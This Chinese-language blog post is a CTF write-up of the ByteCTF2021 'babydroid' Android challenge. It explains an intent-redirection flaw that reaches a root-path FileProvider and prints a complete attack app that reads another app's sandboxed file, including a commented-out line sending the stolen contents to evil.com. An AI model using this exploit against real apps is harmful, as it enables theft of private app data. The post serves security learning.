---
layout: post
title:  babydroid(ByteCTF2021)
date:   2025-02-09 00:08:01 +0300
image:  2025-02-09-woman.jpg
tags:   [ctf,android,reverse,Pwn]
---

接收flag

```assembly
package com.bytectf.babydroid;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class FlagReceiver extends BroadcastReceiver {
    @Override  // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String s = intent.getStringExtra("flag");
        if(s != null) {
            this.writeFile(new File(context.getFilesDir(), "flag"), s);
            Log.e("FlagReceiver", "received flag.");
        }
    }
}
```

FlagReciver是一个广播接收器，经分析是设置flag的，将接收的flag写入文件

但是这里有一点要注意，getFilesDir()是哪个目录呢，这里可以自己写代码进行验证，flag文件存储的目录是/data/data/com.bytectf.babydroid/files/flag。

漏洞所在的Activity

```assembly
package com.bytectf.babydroid;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class Vulnerable extends Activity {
    @Override  // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.startActivity(((Intent)this.getIntent().getParcelableExtra("intent")));
    }
}
```

利用这个方法可以使用传入的intent参数直接`startactivity`且没有任何校验，这样就可以以目标app的身份进行一次`startactivity`完成intent的重定向。

Manifest

```assembly
<?xml version="1.0" encoding="UTF-8"?>
<manifest android:compileSdkVersion="30" android:compileSdkVersionCodename="11" android:versionCode="1" android:versionName="1.0" package="com.bytectf.babydroid" platformBuildVersionCode="30" platformBuildVersionName="11" xmlns:android="http://schemas.android.com/apk/res/android">
  <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30"/>
  <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:debuggable="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.Babydroid">
    <activity android:exported="true" android:name="com.bytectf.babydroid.MainActivity">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <activity android:name="com.bytectf.babydroid.Vulnerable">
      <intent-filter>
        <action android:name="com.bytectf.TEST"/>
      </intent-filter>
    </activity>
    <receiver android:exported="false" android:name="com.bytectf.babydroid.FlagReceiver">
      <intent-filter>
        <action android:name="com.bytectf.SET_FLAG"/>
      </intent-filter>
    </receiver>
    <provider android:authorities="androidx.core.content.FileProvider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
      <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
    </provider>
  </application>
</manifest>
```

当Activity中存在intent-filter时默认时可导出的，所以外部应用可以直接打开`Vulnerable`

存在一个非导出的`FileProvider`，可以提供文件的读写和分享能力。其执行的file_paths内容如下：

file_path.xml

```assembly
<?xml version="1.0" encoding="UTF-8"?>
<paths>
  <root-path name="root" path=""/>
</paths>
```

无法直接访问 file provider， 但是可以通过 Intent 重定向来窃取 flag 文件

### FileProvider

​	 Android 7开始不允许以 file:// 的方式通过 Intent 在两个 App 之间分享文件，而是通过 FileProvider 生成 content://Uri 。如果在 Android 7以上的版本继续使用 file:// 的方式分享文件，则系统会直接抛出异常。

​	 FileProvider 是一个特殊的 ContentProvider 子类，如果使用包含 Content URI 的 Intent 共享文件时，需要申请临时的读写权限，这可以通过 Intent.setFlags() 方法实现。

其导出的文件可以从root即根路径开始，都可以用这个FileProvider访问到(前提时目标app有权限访问，可以访问目标app沙箱内部的文件，以此完成沙箱内的文件读写，甚至可以读写内部的可执行文件，dex or so)

所以可以使用**intent重定向**来访问这个非导出的FileProvider内容，使用目标app的权限来读取其沙箱内部的文件。flag文件是通过接收广播后写入到沙箱内部files文件夹中的。

### 攻击

首先使用命令发送广播，创建flag文件：

```assembly
adb shell su root am broadcast -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag 'flag{success!!!}'
```

攻击代码：

```assembly
package com.example.myapplication;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {
    public TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if(getIntent().getAction().equals("evil")){
            Uri data = getIntent().getData();
            try {
                InputStream inputStream = getContentResolver().openInputStream(data);
                byte[] bytes = new byte[inputStream.available()];
                inputStream.read(bytes);
                String str = new String(bytes);
                Log.e("evil", str);
//                httprequest("http://evil.com/?" + str);
                tv = findViewById(R.id.tv);
                tv.setText(str);

            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }else{
            Intent extra = new Intent("evil");
            extra.setClassName(getPackageName(), MainActivity.class.getName());
            extra.setData(Uri.parse("content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag"));
            extra.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                    | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                    | Intent.FLAG_GRANT_READ_URI_PERMISSION
                    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

            Intent intent = new Intent();
            intent.setClassName("com.bytectf.babydroid", "com.bytectf.babydroid.Vulnerable");
            intent.setAction("com.bytectf.TEST");
            intent.putExtra("intent", extra);
            startActivity(intent);
        }
    }
}
```

Intent中加入下面这些中**`Grant相关的flags`**

```assembly
public static final int FLAG_GRANT_READ_URI_PERMISSION = 0x00000001;
public static final int FLAG_GRANT_WRITE_URI_PERMISSION = 0x00000002;
public static final int FLAG_GRANT_PERSISTABLE_URI_PERMISSION = 0x00000040
public static final int FLAG_GRANT_PREFIX_URI_PERMISSION = 0x00000080;
```

- FLAG_GRANT_READ_URI_PERMISSION：允许接收者读取 URI 的内容，即读取 URI 的数据，并在权限授予期间保持该权限。

- FLAG_GRANT_WRITE_URI_PERMISSION：允许接收者写入 URI 的内容，即修改 URI 的数据，并在权限授予期间保持该权限。

- FLAG_GRANT_PERSISTABLE_URI_PERMISSION：与 `**FLAG_GRANT_READ_URI_PERMISSION** `或 **`FLAG_GRANT_WRITE_URI_PERMISSION `**一起使用，表示允许接收者在授予许可后持久保存该权限。这意味着即使应用程序被关闭，权限也会保持有效，并且对 URI 的访问仍然是允许的。

- FLAG_GRANT_PREFIX_URI_PERMISSION：允许接收者读取或写入指定 URI 的所有后代 URI，而不必单独为每个 URI 授予权限。

攻击成功

![](https://raw.githubusercontent.com/yqw1212/yqw1212.github.io/refs/heads/master/img/2025-02-09-attack.png)

参考

https://linkleyping.top/bytectf2021-pre/#babydroid

https://blog.lleavesg.top/article/ByteCTF-2021-BabyDroid#5359052ae6cf4907a20ecbbe64504624

https://mp.weixin.qq.com/s/rxrmtK-Q7RJAbdRVoRNlOA